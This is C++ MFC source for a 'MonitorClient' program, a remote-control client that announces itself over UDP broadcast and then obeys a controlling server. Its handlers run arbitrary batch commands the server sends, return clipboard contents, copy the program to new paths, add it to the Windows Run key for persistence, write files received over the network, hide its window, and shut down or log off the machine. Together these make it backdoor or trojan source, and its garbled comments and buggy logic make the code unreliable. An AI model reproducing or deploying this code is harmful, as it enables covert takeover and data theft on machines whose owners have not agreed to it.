// MonitorClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "MonitorClient.h"
#include "MonitorClientDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMonitorClientDlg dialog

CMonitorClientDlg::CMonitorClientDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMonitorClientDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMonitorClientDlg)
	m_mymsg = _T("");
	m_msgrecord = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMonitorClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMonitorClientDlg)
	DDX_Text(pDX, IDC_ChatSend, m_mymsg);
	DDX_Text(pDX, IDC_ChatRecord, m_msgrecord);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMonitorClientDlg, CDialog)
	//{{AFX_MSG_MAP(CMonitorClientDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BTNSEND, OnBtnsend)
	ON_WM_TIMER()
	ON_WM_CLOSE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMonitorClientDlg message handlers

BOOL CMonitorClientDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	


	cliPortBC=5050;
	
	sockCliBC = ::socket(AF_INET, SOCK_DGRAM, 0);	
	
	// ��ЧSO_BROADCASTѡ��
	BOOL bBroadcast = TRUE;
	::setsockopt(sockCliBC, SOL_SOCKET, SO_BROADCAST, (char*)&bBroadcast, sizeof(BOOL));
	int iMode = 1; //0������
	ioctlsocket(sockCliBC,FIONBIO, (u_long FAR*) &iMode);//����������
	
	
	// ���ù㲥��ַ������Ĺ㲥�˿ںţ���̨����4567
	addrSrvInfo.sin_family = AF_INET;
	addrSrvInfo.sin_addr.s_addr = INADDR_BROADCAST;
	addrSrvInfo.sin_port = htons(cliPortBC);
	
	GetDlgItem(IDC_BTNSEND)->EnableWindow(FALSE);
	
	
	struct hostent *host;
	struct in_addr *ptr;	// ���IP��ַ
	char szHostName[200];
	//���������
	gethostname( szHostName, strlen( szHostName ) );
	host = gethostbyname("");/////��ȡ����IP
	ptr = (struct in_addr *) host->h_addr_list[0];
	
	
	
	// ��ȡIP��ַ��Ϣ����ַ��ʽ���£� 211.40.35.76 				
	int a = ptr->S_un.S_un_b.s_b1;  // 211				
	int b = ptr->S_un.S_un_b.s_b2;  // 40
	int c = ptr->S_un.S_un_b.s_b3;  // 35
	int d = ptr->S_un.S_un_b.s_b4;  // 76
	strLocalInfo.Format("CLIENTINFO:%s;%d.%d.%d.%d",szHostName,a,b,c,d);//////////////�ͻ��˹㲥��Ϣ��ͷΪCLIENTINFO		








	SetTimer(1,500,NULL);//��һ�����������Լ������Ƕ�ʱ��ID �ڶ��������Ǽ��ʱ(����Ϊ��λ�ģ�
	SetTimer(2,500,NULL);
	T1state=true;
	GetDlgItem(IDC_BTNSTART)->EnableWindow(FALSE);
	GetDlgItem(IDC_BTNSTART)->SetWindowText("��ȴ�...");
//	ShowWindow(SW_HIDE);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMonitorClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMonitorClientDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMonitorClientDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}
void CMonitorClientDlg::OnBtnsend() 
{	
	//������Ϣ 
	UpdateData(TRUE);
	
	CString t="--"+m_mymsg;
	m_msgrecord+=t;
	m_msgrecord+="\r\n";
	
	int a=SendMsg("&CHAT&"+m_mymsg);
	
	m_mymsg="";
	
	UpdateData(FALSE);
}
int CMonitorClientDlg::Listen(CString& t)
{
	int len=sizeof(SOCKADDR);
	char recvbuf[100];
	int n= recvfrom(sockCliBC,recvbuf,100,0,(SOCKADDR*)&addrSrvInfo,&len);
	
	t=recvbuf;
	return n;
}

int CMonitorClientDlg::SendMsg(CString msg)
{
	char *sendbuf;
	sendbuf=msg.GetBuffer(msg.GetLength());
	
	int n=::sendto(sockCliBC,sendbuf,msg.GetLength()+1,0,(sockaddr*)&addrSrvInfo,sizeof(addrSrvInfo));
	return n;
}
void CMonitorClientDlg::ifconnected()
{
	GetDlgItem(IDC_BTNSTART)->SetWindowText("������");
	GetDlgItem(IDC_BTNSEND)->EnableWindow(TRUE);
	if (T1state==true)
	{
		KillTimer(1);
		T1state=false;
	}	
//	m_msgrecord+="�����ӷ�����\r\n";
//	UpdateData(FALSE);
}


void CMonitorClientDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	CString temp;
	switch(nIDEvent)
	{
	case 1:
		// ���͹㲥
		SendMsg(strLocalInfo);
		break;
	case 2:
		if (Listen(temp)>0)
		{
			if(temp.Left(9)=="CONNECTED")
			{////////������ܵ��˷���˻�Ӧ   ��Ϣ��ͷӦΪ��CONNECTED��
				ifconnected();	
			}
			else
			{
				DealMsg(temp);
			}
		}
		break;
	}
	CDialog::OnTimer(nIDEvent);
}
void CMonitorClientDlg::DealMsg(CString msg)////remotecontrol(COMMAND)  chat(chat)   othercontrol(Other)   screen(SCREEN)
{
	if ("&DISCONNECTED&"==msg.Left(14))
	{
		GetDlgItem(IDC_BTNSTART)->SetWindowText("�ѶϿ�");
	//	GetDlgItem(IDC_BTNSTART)->EnableWindow(true);
		GetDlgItem(IDC_BTNSEND)->EnableWindow(false);
		addrSrvInfo.sin_addr.s_addr = INADDR_BROADCAST;

		if (T1state==false)
		{
			SetTimer(1,500,NULL);
			T1state=true;
		}
	}
	else if ("&COMMAND"==msg.Left(8))
	{
		DealRemoteControl(msg);
	}
	else if ("&CHAT"==msg.Left(5))
	{
		DealChat(msg);
	}
	else if ("&OTHER"==msg.Left(6))
	{
		DealOtherControl(msg);
	}
	else if ("&SCREEN"==msg.Left(7))
	{
		DealScreenMonitor(msg);
	}
	else if ("&SET"==msg.Left(4))
	{
		DealSet(msg);
	}


}
void CMonitorClientDlg::DealChat(CString msg)
{
	CString t="--"+msg.Mid(6);
	m_msgrecord+=t;
	m_msgrecord+="\r\n";
	UpdateData(FALSE);
}
void CMonitorClientDlg::DealRemoteControl(CString msg)
{
	CWnd* cwnd;
	if ("&COMMAND_HIDEDESK&"==msg.Left(18))
	{
		cwnd = FindWindow("ProgMan",NULL);
		::ShowWindow(cwnd->GetSafeHwnd(),SW_HIDE);
	}
	else if ("&COMMAND_SHOWDESK&"==msg.Left(18))
	{
		cwnd = FindWindow("ProgMan",NULL);
		::ShowWindow(cwnd->GetSafeHwnd(),SW_SHOW);
		
	}
	else if ("&COMMAND_LOGOFF&"==msg.Left(16))
	{
		::ExitWindowsEx(EWX_LOGOFF,0);
	}
	else if ("&COMMAND_SHUTDOWN&"==msg.Left(18))
	{
		::ExitWindowsEx(EWX_SHUTDOWN,0);
	}
	else if ("&COMMAND_REBOOT&"==msg.Left(16))
	{
		::ExitWindowsEx(EWX_REBOOT,0);
	}
	else if ("&COMMAND_TURNONSCR&"==msg.Left(16))
	{
	//	SendMessage(FindWindow(0,0), WM_SYSCOMMAND, SC_MONITORPOWER, -1); //����ʾ��	
	}
	else if ("&COMMAND_TURNOFFSCR&"==msg.Left(16))
	{
	//	SendMessage(FindWindow(0,0), WM_SYSCOMMAND, SC_MONITORPOWER, 1); 
        //�ر���ʾ�� ����MSDN��������������1���� ��ʾ��ʾ�����ڵ��ܺ�״̬��
	}
}
void CMonitorClientDlg::DealOtherControl(CString msg)
{
	if ("&OTHER_GETCLIPBOARD&"==msg.Left(20))
	{
		//�жϼ���������ݸ�ʽ�Ƿ���Դ���
		if (!IsClipboardFormatAvailable(CF_UNICODETEXT))
		{
			return;
		}   
		//�򿪼����塣
		//		if (!OpenClipboard(m_hWnd))
		if (!OpenClipboard())
		{
			return;
		}   
		//��ȡUNICODE�����ݡ�
        HGLOBAL hMem = GetClipboardData(CF_TEXT);
		if (hMem != NULL)
		{
			//��ȡUNICODE���ַ�����
			LPTSTR lpStr = (LPTSTR)GlobalLock(hMem);
			if (lpStr != NULL)
			{
				//��ʾ�����
				//OutputDebugString(lpStr);
				CString t=lpStr;
				t="&OTHER_GETCLIPBOARD&"+t;
				
				SendMsg(t);
				
				//�ͷ����ڴ档
				GlobalUnlock(hMem);
			}
		}
		//�رռ����塣
		CloseClipboard();
	}
	else if ("&OTHER_SETCLIPBOARD&"==msg.Left(20))
	{
		int n=msg.Find(':');
		///////��ȡ��Ҫ���Ƶ���·��
		CString source=msg.Mid(n+1);

		if(OpenClipboard())
		{ 
			HGLOBAL clipbuffer; 
			char *buffer; 
			EmptyClipboard(); 
			clipbuffer=GlobalAlloc(GMEM_DDESHARE,   source.GetLength()+1); 
			buffer=(char*)GlobalLock(clipbuffer); 
			strcpy(buffer,   LPCSTR(source)); 
			GlobalUnlock(clipbuffer); 
			SetClipboardData(CF_TEXT,clipbuffer); 
			CloseClipboard(); 
		}
	}
	else if ("&OTHER_COPYYOUSELF&"==msg.Left(19))
	{
		char buf[256]; 
		GetModuleFileName(0,buf,255);
		
		int n=msg.Find(':');
		CString t=msg.Mid(n+1);///////��ȡ��Ҫ���Ƶ���·��
		
		CopyFile(buf,t,NULL);
	}
	else if ("&OTHER_SETONSTART&"==msg.Left(18))
	{
		int n=msg.Find(':');
		CString t=msg.Mid(n+1);///////��ȡ��Ҫ�����������·��
		
		HKEY hKey;   
		//�ҵ�ϵͳ��������   
		LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";   
		//��������Key   
		long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);   
		if(lRet == ERROR_SUCCESS)   
		{   
			char pFileName[MAX_PATH] = {0};   
			//�õ����������ȫ·��   
			DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);   
			//���һ����Key,������ֵ
			// �����"test"��Ӧ�ó������֣����Ӻ�׺.exe��  
			lRet = RegSetValueEx(hKey, "test", 0, REG_SZ, (BYTE *)pFileName, dwRet);   
			//�ر�ע���   
			RegCloseKey(hKey);   
			if(lRet != ERROR_SUCCESS)   
			{   
				//AfxMessageBox("ϵͳ��������,������ɿ�����������");  
				SendMsg("&OTHER_SETONSTART_SUCCESS&");
			}   
			else  
			{  
				SendMsg("&OTHER_SETONSTART_ERROR&");
				//AfxMessageBox("�򿪿��������ɹ�");   
			}
		}
	}
	else if ("&OTHER_BATCONTROL&"==msg.Left(18))
	{
		TCHAR strExePath[_MAX_PATH];
		GetModuleFileName(NULL,strExePath,_MAX_PATH);
		CString path=strExePath;
		int n=path.ReverseFind(_T('\\'));	
		CString name=path.Right(path.GetLength()-n-1);
		path=path.Left(n);
		n=name.ReverseFind(_T('.'));
		name=name.Left(n);
		name=name+".bat";/////�����ɵ�bat�ļ��ͳ�������һ��   ����MonitorClient.bat
		

		n=msg.Find(':');
		CString t=msg.Mid(n+1);///////��ȡ����
		
		CFile f;
		char* pFileName =name.GetBuffer(name.GetLength());
		if(f.Open(pFileName, CFile::modeCreate | CFile::modeWrite))
		{
			f.Write(t.GetBuffer(t.GetLength()),t.GetLength());
		}


		///����bat
		path+="\\";
		path+=name;
		f.Close();
		WinExec(path.GetBuffer(path.GetLength()),SW_SHOW);
	}
	else if ("&OTHER_SENDFILE&"==msg.Left(16))
	{
		int dataLength;
		int pos=msg.Find('&',2);
		dataLength=_ttoi(msg.Mid(pos+1,1));

		int n1,n2;
		n1=msg.Find('<',pos+1);
		n2=msg.Find('>',n1+1);

		CString pathtosave=msg.Mid(n1+1,n2-n1-1);


		CString filedata=msg.Mid(n2+1);
		byte* data = new byte[dataLength];
	
	//	data=(byte*)filedata.GetBuffer(filedata.GetLength());
		data=(byte*)filedata.GetBuffer(dataLength);
	//	memcpy(data,filedata.GetBuffer(filedata.GetLength()),filedata.GetLength());  //��cstring����byte����

	//	MessageBox(filedata);

		CFile destFile(pathtosave.GetBuffer(pathtosave.GetLength()), 
			CFile::modeCreate | CFile::modeWrite | CFile::typeBinary);
	
	
		CString  t1=data;
		CString t2;
		t2.Format("%s,%d,%d",data,t1.GetLength(),dataLength);
		MessageBox(t2);

		
		destFile.Write(data,dataLength); // Write it



	//	destFile.Write(data,filedata.GetLength());
		destFile.Close();
		delete data;
		
	}
}
void CMonitorClientDlg::DealScreenMonitor(CString msg)
{
	;
}
void CMonitorClientDlg::DealSet(CString msg)
{
	if ("&SET_VISABLE&"==msg.Left(13))
	{
		ShowWindow(SW_SHOW);
	}
	else if ("&SET_INVISABLE&"==msg.Left(15))
	{
		ShowWindow(SW_HIDE);

		// "��ǰ���̺�: ", lnProcessId 
	//	lnProcessId = 
		//	GetCurrentProcessId();
			// "���ص�ǰ����: " 
		//	RegisterServiceProcess(lnProcessId, RSP_SIMPLE_SERVICE) 
			// "��ʾ��ǰ����: " 
		//	RegisterServiceProcess(lnProcessId, RSP_UNREGISTER_SERVICE) 
		
	}
}


void CMonitorClientDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	SendMsg("&DISCONNECTED&");
	CDialog::OnClose();
}
